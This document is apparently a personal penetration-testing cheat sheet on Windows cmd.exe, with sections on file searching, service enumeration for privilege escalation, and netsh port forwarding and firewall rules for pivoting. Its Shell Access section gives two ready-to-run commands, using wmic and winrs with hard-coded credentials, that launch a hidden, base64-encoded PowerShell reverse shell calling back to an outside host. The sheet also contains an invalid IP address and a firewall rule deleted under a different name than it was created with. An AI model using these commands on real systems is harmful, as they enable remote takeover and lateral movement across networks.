> Command Prompt, also known as cmd.exe or cmd, is the default command-line interpreter for the OS/2, eComStation, ArcaOS, Microsoft Windows, and ReactOS operating systems.

# Carry out commands

Prevent shell from hanging when running commands
```bash
cmd.exe /c <command_here>
cmd.exe /c start <command_here>
```

# File Searching

#File_Searching

Recursively list directory
```cmd
dir /s
```

List hidden files
```
dir /adh
```

# Shell Access

#Shell_Access #Remote_Access #Active_Directory_Lateral_Movement

Running the WMI command-line utility to spawn a process on a remote system
- E.g., UTF16 Encoded PowerShell reverse-shell payload
```cmd
wmic /node:192.168.150.69 /user:hentaisales /password:Salesman! process call create 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

Using WinRS to execute commands remotely
- E.g., UTF16 Encoded PowerShell reverse-shell payload
```cmd
winrs -r:files69 -u:hentaisales -p:Salesman!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

# Services

#Windows_Enumeration #Windows_Privilege_Escalation 

Show list of services with spaces and missing quotes in the binary path
```cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

# Port Forward

#Port_Forwarding 

## Netsh

### portproxy

Adding a port forwarding rule with `netsh portproxy`
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.69 connectport=22 connectaddress=10.4.50.269
```
- `netsh interface portproxy add`
	- `netsh interface` to `add` a `portproxy` rule
- `v4tov4`
	- from an IPv4 listener that is forwarded to an IPv4 port.
- `listenport=2222 listenaddress=192.168.50.69`
	- This will listen on port 2222 on the external-facing interface 
- `connectport=22 connectaddress=10.4.50.269`
	- Forward packets to port 22 on the internal-facing interface

Listing all the `portproxy` port forwarders set up with `netsh`
```cmd
netsh interface portproxy show all
```

Deleting a port forwarding rule with `netsh portproxy`
```cmd
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.69
```
- `netsh interface portproxy del`
	- `netsh interface` subcontext to `del` the `portproxy` we created
- `v4tov4`
	- Reference the forwarding type
- `listenport=2222 listenaddress=192.168.50.69`
	- Reference the `listenaddress` and `listenport` we used when creating the rule

### advfirewall

Adding a Windows Firewall rule with `netsh advfirewall`
```cmd
netsh advfirewall firewall add rule name="sussy_port_forward_2222" protocol=TCP dir=in localip=192.168.50.69 localport=2222 action=allow
```
- `add rule name="sussy_port_forward_2222"` 
	- Add and name the rule "sussy_port_forward_2222".
		- Use a memorable or descriptive name, because we'll use this name to delete the rule later
- `protocol=TCP dir=in localip=192.168.50.69 localport=2222 action=allow`
	- Allow connections on the local port (`localport=2222`) on the interface with the local IP address (`localip=192.168.50.69`) using the TCP protocol, specifically for incoming traffic (`dir=in`).

Deleting the firewall rule with `netsh advfirewall`
```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
